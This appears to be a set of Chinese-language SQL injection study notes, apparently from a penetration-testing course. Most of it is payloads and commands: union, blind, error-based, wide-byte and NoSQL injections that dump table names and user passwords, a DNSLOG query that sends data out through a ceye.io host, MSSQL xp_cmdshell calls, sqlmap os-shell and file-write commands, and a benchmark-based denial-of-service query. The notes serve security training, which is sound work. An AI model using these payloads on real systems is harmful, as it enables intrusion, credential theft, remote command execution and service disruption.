

### SQL注入原理

```
1、参数用户可控
2、服务器对参数没有过滤或者过滤不严谨
	
前端用户输入用来查询数据库的一个sql语句，id=1,服务器需要对该id进行过滤，然后拼接sql语句
select * from user where id=1;
id=1 or 1=1
select * from user where id=1 or 1=1页面会显示正常
	
select * from user where id='$_POST["id"]';

危害：
读取数据库的数据
修改或者删除数据
往服务器读写文件
getshell
```

### 万能密码原理

```
select * from admin where username='user' and password='pass'
用户名： 1' or 1=1#
密码：123
select * from admin where username='1' or 1=1#' and password='123'
select * from admin where username='1' or 'a'='a'# and password='123'
```

### sql注入

```
数据提交方式：GET方式，POST方式 Cookie注入 HTTP头注入 
根据sql注入点的参数类型分类：数字型注入、字符型注入、搜索型注入
根据反馈类型：报错注入、联合注入、布尔注入、时间注入 堆注入
根据数据库类型：MSSQL MYSQL ORACLE ACCESS NOSQL LDAP！！！等
	
手工注入：
常用函数：
user() version() database() concat() group_concat() concat_ws()
分割字符串mid()  mysql
substr()  oracle、mysql、sqlserver
substring() mysql、sqlserver
left()  从左截取
right() 从右截取
	
条件判断
if(判断的条件，条件为帧返回值，条件为假返回值)
select if("1=1",'true','false');
select if(ascii(substr(database(),1,1))>92,"true","false");
select if(ascii(substr(database(),1,1))=ascii('r'),"true","false");（database(),1,1)   起始位置1，截取长度
substr 截取字符串
ascii
case when 判断条件 then 条件为真返回值 else 条件为假返回值 end
select case when 1=1 then "right" else "wrong" end;
select case when ascii(substr(database(),1,1))>92 then "right" else "wrong" 			end;

数据库注释：#（%23  url编码） -- +（注释掉后面）
连接符号+
length(字符串) 计算字符串长度
select length(user());
```

### union 联合查询

```
select name,pass,gender from users where uid=1 union select 1,2,3//前后字段要求一 致
可以根据union 判断当前的sql选择的字段数，可以在显错注入中，判断哪个字段在前端显示
order by n //对第n个字段进行排序,如n超过表的列数，报错。 可以根据order by判断数据库表有几列
	
mysql 数据库特性
mysql 5.0上下区别：
1、5.0以上支持information_schema 
自带，系统库，汇总（其他数据库名，表名，字段名）存在于information_schema的columns中
需要关注columns三个字段  table_schema库名 table_name表名 column_name字段名
select distinct table_schema from information_schema.columns//库名distinct去重
select distinct table_name from information_schema.columns  //表名
select table_name from information_schema.columns where table_schema='x'所有表
		
select distinct column_name from information_schema.columns where 					table_schema='dvwa' and table_name='user'; 获取dvwa下user表的字段
注意：可以根据需求将数据库名和表名转换成16进制

手工注入：
1、判断是否有注入（判断从后台数据库中选取的列数，判断哪几列在前端显示）
2、收集数据库信息（用户名、版本、当前数据库名）
3、获取当前数据库下的所有表名
4、获取当前数据库下指定表中的字段名
5、获取字段对应的数据
6、破解数据、登录系统，getshell,提权
	
案例分析
1、找url,判断注入点
url:id=1   inurl:id=
判断方式
'  /and sleep(5)   and '1'='1 '1'='2 /' and or 
根据页面显示效果或者提示信息来判断用户提交的数据是否在数据库中被执行
		
2、判断数据库类型
常见架构
php+mysql
jsp/asp+mssql
jsp/asp+access
jsp+oracle
		 
函数
http://target.com?id=1 and user>0 (mssql正常执行)
http://target.com?id=2 and version()>0 (mysql正常执行)
		 	
报错信息来判断数据库类型
http://target.com?id=1 and (select count(*) from sysobjects)>0 sqlserver
http://target.com?id=1 and (select count(*) from myobjects)>0  oracle
http://target.com?id=1 and (select count(*) from   			 			information_schema.columns)>0     mysql
		 	
确定列数和位置	
http://target.com?id=1 order by 10 判断列数
http://target.com?id=1 union select 1,2,3,4,5 
如果不回显，让第一个select变为假 如id=-1   !!!!!!
http://target.com?id=-1 union select 1,2,3,4,5  
		 	
收集信息

所有数据库
http://192.168.91.131/jdy/typeid.php?typeid=-1 union select 1,(select group_concat(distinct table_schema) from information_schema.columns),3,4,5
			
group_concat将多个字符串合并成一个字符串		
			
当前数据库
http://target.com?id=-1 union select 1,(database()),3,4,5
数据库版本
http://target.com?id=-1 union select 1,(version()),3,4,5
用户
http://target.com?id=-1 union select 1,user(),3,4,5
临时文件夹
http://target.com?id=-1 union select 1,(@@tmpdir),3,4,5
数据库文件所在位置
http://target.com?id=-1 union select 1,(@@datadir),3,4,5
		 	
获取当前数据库下表名 	
http://target.com?id=-1 union select 1,(select group_concat(distinct 				table_name) from information_schema.tables where 				table_schema=database()),3,4,5
		 	
http://target.com?id=-1 union select 1,(select group_concat(distinct 				table_name) from information_schema.columns where table_schema=十六进制的数据库名 0x开头)),3,4,5
		 	
获取当前数据库下指定表字段			 	
http://target.com?id=-1 union 1,(select group_concat(distinct column_name) from information_schema.columns where table_schema=database() and table_name=十六进制的表名 0x开头)3,4,5		 	
		 	
获取字段的数据
http://target.com?id=-1 union select 1,(select concat_ws(列1，列2) from 表名 limit 0,1)3,4,5 
		 
concat_ws   参数之间的分隔符 由于返回是多个值，所以需要进行limit
```

### 盲注

```
定义：用户提交的数据在后台数据库中执行，没有任何的数据（报错信息，执行sql语句的数据）传到前端可以使用基于布尔的盲注、基于时间的盲注 利用这些方法，结合浏览器的效果，判断payload的正确性。

使用bool  判断页面是否正常
使用time  页面加载时间
数据库函数
length() 长度
ascii() 返回字符ascii值
if()
mid
substr()
substring()

基于布尔的盲注探测
1、探测注入点  ' / 1' and 1=1 # /1 ' and '1'='1'#
用户提交的数据被带入到后台数据库中执行，根据页面效果判断此处是否有注入点
2、收集信息
http://target.com?id=1' and length(user<10)%23  //假设用户民长度10
http://target.com?id=1' and ascii(substr(user(),1,1))<120%23 第一位
http://target.com?id=1' and ascii(substr(user(),2,1))<120%23 第二位
用工具burp suite爆破  可以sniper 也可以cluster  boomper
3、查询当前数据库中的表
http://target.com?id=1' and ascii(substr((select distinct table_name from information_schema.columns where table_schema=database() limit 0,1),1,1))=120%23 
4、获取字段名   '表名' 有可能被代码注释掉，所以选用0x开头的16进制
http://target.com?id=1' and ascii(substr((select distinct column_name from information_schema.columns where table_schema=database() and table_name='表名' limit 0,1),1,1))=120%23 
5、获取字段数据
http://target.com?id=1' and ascii(substr((select concat(username,0x3a,password) from users limit 0,1),1,1))=120%23 
```

### 报错注入

```
之所以能报错，是因为有回显
报错函数：
1、extractvalue(参数1，参数2)
从目标XML中返回查询的字符串，参数1是string,XML文档名，参数2是Xpath格式，要查询的字符串
select extractvalue(1,concat(0x7e,(select user()),0x7e));
2、updatexml(参数1、参数2、参能3)
改变文档中符合条件的节点的值，参数1是xml文档，参数2
是xpath的字符串，参数3是string 格式替换查找符合如条件的数据
select updatexml(1,concat(0x7e,(version()),0x7e),1);
		
前两个报错的长度有限制32位。

3、floor()函数 ，必须是和count() rand() group by配合报错
select * from news where tid=1 and select 1 from (select count(*),)
		
SELECT count(*),concat(FLOOR(rand(0)*2),(SELECT database()))x from 					information_schema.tables GROUP BY x
			
7种报错函数
1、geometrycollection（）
select * from news where tid=1 and geometrycollection((select * from (select * from 	(select user())a)b));
	
2、multipoint()函数
select * from test where id=1 and multipoint((select * from(select * from(select 	 user())a)b));

3、polygon()函数
select * from test where id=1 and polygon((select * from(select * from(select 		user())a)b));

4、multipolygon()函数
select * from test where id=1 and multipolygon((select * from(select * from(select 	   user())a)b));

5、linestring()函数
select * from test where id=1 and linestring((select * from(select * from(select 	user())a)b));

6、multilinestring()函数
select * from test where id=1 and multilinestring((select * from(select * 			from(select user())a)b));

7、exp()函数
select * from test where id=1 and exp(~(select * from(select user())a));

实验演示
select extractvalue(1,concat(0x7e,(select user()),0x7e));

http://192.168.91.148/sqli-labs-master/Less-5/?id=1' and extractvalue(1,concat(0x7e,(select user()),0x7e))%23;

http://192.168.91.148/sqli-labs-master/Less-5/?id=1' and extractvalue(1,concat(0x7e,(select table_name from information_schema.columns where table_schema=database() limit 0,1),0x7e)) --+
```

### 基于时间的盲注

```
函数：
sleep()  benchmark()要与条件类函数配置使用
sleep(参数)  参数直接写以秒为单位的时间数字  sleep(5)
select * from users where id=1 and select if(1=1,sleep(5),'bye')
		
benchmark(参数1，参数2)  参数1：表示执行某项操作的次数   参数2：某项操作
select if(length(user())>4,benchmark(500000,md5('abc')),'bye')

时间盲注
	substr(string,start,length)
	if表达式：if(条件,结果1,结果2)  //如果条件为真，执行结果1。如果为假，执行结果2
	http://10.0.0.21/yanci.php?id=1' and sleep(5)%23
	
	http://10.0.0.21/yanci.php?id=1' and 										if(ascii(substr(database(),1,1))=114,1,sleep(5))#


```

### 各类注入

```
伪静态注入
http://www.xxx.com/index.asp?id=1
http://www.xxx.com/1.html
		
1、开启站点重写机制		
2、接下来新建 .htaccess文件	 	
3、支持解析httpd.conf
AllowOverride All
4、	 	
		 	
宽字节注入		 	
常见转义函数
原因：数据库采用gbk编码，对用户输入的数据进行转义。形成宽字节注入
gbk编码：GB2312的一个扩展		 
addslaches()
mysql_real_escape_string()
mysql_escape_string()   php 5.3以后移除
魔术引号GPC  magic_quotes_gpc
		 	
对特殊字符进行转义    	' " \ NULL 等转义	 \' \"\ \ \	 	
mysql_real_escape_string() 不会对 % _ 进行转义
http://192.168.91.148/kuanzijie/data sql/0x01/?id=1%df'
http://192.168.91.148/kuanzijie/data sql/0x01/?id=1%df\'
http://192.168.91.148/kuanzijie/data sql/0x01/?id=1%df%5c'  //  \的url编码为%5c      	 //df5c构成一个汉字	
http://192.168.91.148/kuanzijie/data sql/0x01/?id=1%df%5c'	 	
http://192.168.91.148/kuanzijie/data sql/0x01/?id=1%df' order by 3%23	 	
http://192.168.91.148/kuanzijie/data sql/0x01/?id=0%df' union select 1,2,3%23
	
http://192.168.91.148/kuanzijie/data sql/0x01/?id=0%df' union select 				1,group_concat(column_name),3 from information_schema.columns where          		table_schema=database() and table_name =0x61646d696e%23   //table 16进制编码 以0x开头

http://192.168.91.148/kuanzijie/data sql/0x01/?id=0%df' union select   				1,group_concat(name,pass),3 from admin%23	
	
二次解码注入
过滤函数（转义函数）
addslaches()
mysql_real_escape_string()
mysql_escape_string()   php 5.3以后移除
	
urldecode()  url解码
浏览器出去的数据被进行url编码，到达服务器后，默认会被url解码
	
http://192.168.91.148/Secondary_code_injection/urldecode.php?id=1%2527
http://192.168.91.148/Secondary_code_injection/urldecode.php?id=1%2527 order by 3%23
http://192.168.91.148/Secondary_code_injection/urldecode.php?id=0%2527 union select 1,2,3%23
	
PDO宽字节	
1、数据库使用GBK编码
2、使用转义函数，如addslaches()
3、PHP版本<5，3，6，
使用PDO连接数据库，设置GBK，没有参数过滤
http://192.168.91.151/PDOkuanzijie/PDO_kuanjiezi.php?id=1%df' order by 8%23
	
http://192.168.91.151/PDOkuanzijie/PDO_kuanjiezi.php?id=1%df' union select 			1,2,3,4,5,6,7,8%23
	
防御方法：
1、mysql_set_charset("gbk") 通过这种方式去设置gbk
2、使用mysql_real_escape_string()转义参数，不会出现拼接。
最好同时使用

cookie注入:
show.asp?id=1 可将id=1 剪切到Cookie: id=1 去尝试是否通过cookie进行传参
拦截数据包  cookie.txt
sqlmap.py -r cookie.txt -p "uname=admin" --level 2

XFF(x forwarded for)注入：
x-forwarded for:
	
二次注入	
是指已存储的数据（脏数据）在被读取后，再次进入到SQL查询语句中导致的注入
二次注入原理：
第一次进行插入数据时候，仅仅使用addslashes()或者魔术引号GPC，对其宏的特殊数据进行转义。
在存入的数据仍然保留原来的格式，但是本身还是脏数据
待数据从数据库取出后，与此次代码进行拼凑，就会造成SQL二次注入

内联注入
select (select 1)a;

堆注入
select * from users;select 1,2,3,4;  前后两个同时执行
	
POST型注入方法
1、拦截数据包，保存  1.txt
sqlmap -r 1.txt -p 参数     //-r 读取文件   -p指定参数
	
DNSLOG在盲注中使用
load_file()  读取文件
max_allowded_packet() 限制读取内容，可以修改数据库读取文件的大小
outfile() 写入文件
	
SELECT LOAD_FILE(CONCAT('\\\\',(select table_name from information_schema.tables 	 where table_schema='security' limit 0,1),'.7j18gd.ceye.io\\abc'));

select if((SELECT LOAD_FILE(CONCAT('\\\\',(select table_name from information_schema.tables where table_schema='security' limit 0,1),'.7j18gd.ceye.io\\abc'))),1,1);
    
OOB技术(带外数据)
```

### SQL注入工具

```
SQL注入工具：
明小子 啊D 萝卜头 穿山甲 SQLMAP
	
sqlmap
支持12个数据库
支持：bool time 报错 union 堆注入 内联
可以获取用户名、密码、权限、
lib sqlmap 核心功能代码
plugins包含12种数据库识别程序
procs包含各种数据库（mssql mysql oracle postgresql）触发程序
shell 远程命令执行
tamper 包含各种饶过WAF脚本
thirdparty 包含第三方插件
txt 表名 列名 UA字典
udf 存放攻击载荷载荷
waf 识别waf脚本
XML 存放检测的payload
	

工作流程
1、初始化
2、开始检测
检测之前是否进行过测试
判断注入点
把检测的url存在放家目录的.sqlmap中output中

解析url,判断url是否可以访问
检测是否有WAF

sqlmap -u "target_url" --identify-waf  检测WAF
sqlmap -u "target_url" --check-waf     检测WAF
	
sqlmap -u "target_url" --technique U  //指定某种特定注入方式 union的大写U  

开始针对注入点进行检测
是否可注入
判断注入请求类型
判断注入类型（xml/payload）

执行用户输入的参数
-u 指定url
-p 指定参数
-v 指定显示级别
--dbs 数据库名
--tables 表名
--columns 列名
--dump 获取数据
--bacth 跳过问询
--dbms 指定数据库类型
	
sqlmap -u "target_url"
sqlmap -u "target_url" --dbs --dbms mysql 查看所有数据库//指定mysql类型
sqlmap -u "target_url" --current-db  查看当前数据库
sqlmap -u "target_url" --tables -D 数据库名 获取当前数据库表 
sqlmap -u "target_url" --columns -T 表名 //猜解列名
sqlmap -u "target_url" --dump -T 表名 -C "列1，列2" //可能不用“” 下次试一下

mysql注入进行ddos攻击
pythin sqlmap -u "target_url" --sql-shell select benchmark(999999999,xx)

sqlmap 自动化搜索注入点 --forms   

sqlmap伪静态注入利用
sqlmap.py -u "http://xxx/1*.html"   在1.html的1后加星，测试此处是否存在注入

sqlmap注入点执行系统命令交互shellSSSS
pythin sqlmap -u "target_url" --os-cmd=ipconfig  //系统命令
pythin sqlmap -u "target_url" --os-shell

判断当前用户是否是DBA
pythin sqlmap -u "target_url" --is-dba

python2 sqlmap.py -u "http://192.168.91.151/sqli-labs-master/Less-1/?id=1" --file-write=C:/Users/Marshal/Desktop/x.txt --file-dest c:/www/x.txt

延时注入  --delay 2 延时两秒注入

pythin sqlmap -u "target_url" --privileges  //查看权限

--level 执行测试等级1-5
--risk  执行测试风险 0-3
```

### MSSQL手工注入

```
step 1：判断注入点
step 2：判断数据库类型：
select * from sysobjects
http://target.com?id=1 and exists(select * from sysobjects)
step 3：注入点权限判断
其返回值是1
select IS_SRVROLEMEMBER('sysadmin'); 判断当前是否为sa
select is_srvrolemember('db_owner'); 判断当前用户写文件、读文件的权限（db_owner）
select is_srvrolemember('public');判断是否有public权限，可以爆破表

报错方法
http://target.com?id=1 and (select IS_SRVROLEMEMBER('sysadmin'))>0

step 4:信息收集
数据库版本 select @@version 
http://target.com?id=1 and (select @@version )=1
http://target.com?id=1 and user>0
查询当前数据库（报错技术）
http://target.com?id=1 and 1=（select db_name()） 
http://target.com?id=1 and 1=(convert(int,db_name()))

db_name(n）表示第几个数据库
获取其他数据库
SELECT top 1 Name FROM Master..SysDatabases where name not in ('master','aspcms');

select DB_NAME(1);

step 5：获取当前数据库下的表
select top 1 name from aspcms.sys.all_objects where type='U' AND is_ms_shipped=0

select top 1 name from aspcms.sys.all_objects where type='U' AND is_ms_shipped=0 and name not in ('AspCms_Collect_Content')

step 6:获取当前数据库下指定表的字段名
如：AspCms_User
select top 1 COLUMN_NAME from aspcms.information_schema.columns where TABLE_NAME='AspCms_User'

select top 1 COLUMN_NAME from aspcms.information_schema.columns where TABLE_NAME='AspCms_User' and COLUMN_NAME not in ('UserID','GroupID','LanguageID','SceneID','LoginName','Password')

step 7:获取字段内容
select top 1 LoginName from AspCms_User
select top 1 Password from AspCms_User
http://target.com?id=1 and 1=(select top 1 Password from AspCms_User)
		
查看是否开启xp_cmdshell	
Select count(*) FROM master. dbo.sysobjects Where xtype ='X' AND name = 'xp_cmdshell'	

http:127.0.0.1/1.asp?id=12;exec master..xp_cmdshell 'net user'
http:127.0.0.1/1.asp?id=12;exec master..xp_cmdshell 'net user'--+
```

### NOSQL注入

```
mongoDB介绍和使用
支持编程语言：PHP ruby python C++ C# java
sql                           nosql
database                     database
table                       collection
row                         以文件方式存储
column                        filed
index                         index
table join                    不支持
主键                           主键
    
show tables   //查看所有表
    
select * from users
db.users.find().pretty()   //pretty查找所有数据
	
创建数据库
use 数据库名 //如果数据库不存在，则直接创建
show dbs   //查看所有数据库
	
db.集合名称（类似于表）.insert({'‘'值1':'值2'})
db.集合名称（类似于表）.insert({"值1":"值2","值1":"值2","值1":"值2"})  //插入多个值
	
删除数据库
db.dropDatabase()  //先use，然后再删除
删除集合
db.集合名称.drop()
	
show collections   //查看所有集合
db.集合名称.find()   //查看结合下所有值
	
db.集合名称.update(
<条件>，
<更新操作符号>，
{            
}
)
	
db.messages.update()
值修改第一条，id最小的那一条
db.messages.update({'title':'google'},{$set:{'title':'google1'}})
修改多条
db.messages.update({'title':'google'},{$set:{'title':'google1'}}),{multi:true}
有疑问
db.messages.update({'_id':ObjectId('5bf14ce97671944dcd71b1cd')},{$set:{'title':'google2'}})
	
删除某条记录
db.messages.remove({''})
db.messages.deleteMany({''})
	
查询
db.集合名.find().pretty()  所有文档
	
有条件查询
=  {key:value}
<  {key:{$lt:value}}   //值小于value的结果
>  {key:{$gt:value}}   //值大于value的结果
<= {key:{$lte:value}}  //值小于等于的结果
=> {key:{$gte:value}}  //值大于等于的结果
！= {key:{$ne:value}}   //不等于
	
db.demo.find('key':{$gte:90})  查找key大于90的
	
and 多个条件合并
db.demo.find({'英语成绩'：{$gte:90},'物理成绩'：{$gte:80}})
	
or条件
db.demo.find($or:[{'英语成绩'：{$gte:90},'物理成绩'：{$gte:80}}]) 查找大于90或大于80
	
PHP操作MongoDB
mongo   //面向过程
mongodb //面向对象

sort(-1)   //升序
sort(1)    //降序

正则查询：
db.集合名.find({"age":{$regex:"^a"}})  //

NoSQL注入

PHP数组注入
重言式（永真）
username=123&password=123
username[$ne]=123&password[$ne]=123  //查找账号不是123，密码不是123的
db.users.find({"username:{$ne:"123"},{"password:{$ne:"123"}"})
		
联合查询
	
js注入
账号：a'; return true; var='
密码：1		
	
mongo shell拼接注入
http://192.168.1.1/cmd.php?											username="});db.messages.insert({"name":"wangwu"});db.messages.find({"author":"1
	
利用正则 burpsuite爆破
logname[$regex]=^admin&logpass[$regex]=^flag{djhd-fhei3-29ij-9iok}§1§&submit=%E7%99%BB%E5%BD%95  
	
魔术引号
转义函数
使用PDO
		
无逗号注入	
xxx'-cast((select CASE WHEN ((MY_QUERY) like 'CHAR_TO_BRUTE_FORCE%25') THEN (sleep(1)) ELSE 2 END) as char)-'			
```

